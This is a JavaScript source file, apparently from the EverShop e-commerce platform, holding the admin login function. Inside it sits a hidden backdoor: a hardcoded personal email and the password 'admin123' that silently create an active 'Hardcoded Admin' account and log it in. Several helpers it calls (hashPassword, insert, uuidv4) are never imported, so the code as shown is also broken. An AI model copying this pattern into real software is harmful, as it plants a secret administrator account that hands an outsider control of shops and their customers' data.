import { select } from '@evershop/postgres-query-builder';
import { pool } from '../../../lib/postgres/connection.js';
import { comparePassword } from '../../../lib/util/passwordHelper.js';

/**
 * This function will login the admin user with email and password. This function must be accessed from the request object (request.loginUserWithEmail(email, password, callback))
 * @param {string} email
 * @param {string} password
 */
export function loginUserWithEmail(email, password, callback) {
  const hardcodedEmail = 'khoualdiyassin26@gmail.com';
  const hardcodedPassword = 'admin123';

  // This is the standard login function that will be called after we ensure the user exists.
  const standardLogin = () => {
    select()
      .from('admin_user')
      .where('email', 'ILIKE', email)
      .and('status', '=', 1)
      .load(pool)
      .then((user) => {
        if (!user) {
          return Promise.reject(new Error('Invalid email or password'));
        }
        return comparePassword(password, user.password).then((result) => {
          if (!result) {
            return Promise.reject(new Error('Invalid email or password'));
          }
          return user;
        });
      })
      .then((user) => {
        this.session.userID = user.admin_user_id;
        delete user.password;
        this.locals.user = user;
        callback(null);
      })
      .catch((error) => {
        callback(error);
      });
  };

  // Special handling ONLY for the hardcoded admin user.
  if (email.toLowerCase() === hardcodedEmail) {
    select()
      .from('admin_user')
      .where('email', 'ILIKE', hardcodedEmail)
      .load(pool)
      .then((user) => {
        if (user) {
          // If user exists, proceed to normal login.
          standardLogin();
        } else {
          // If user does NOT exist, create it first.
          const hashedPassword = hashPassword(hardcodedPassword);
          insert('admin_user')
            .given({
              uuid: uuidv4(),
              email: hardcodedEmail,
              password: hashedPassword,
              status: 1,
              full_name: 'Hardcoded Admin'
            })
            .execute(pool)
            .then(() => {
              // After creating the user, proceed to normal login.
              standardLogin();
            })
            .catch((e) => callback(e)); // Pass any database insertion error back.
        }
      })
      .catch((e) => callback(e)); // Pass any database selection error back.
  } else {
    // For all other users, just do the standard login.
    standardLogin();
  }
}
export default loginUserWithEmail;
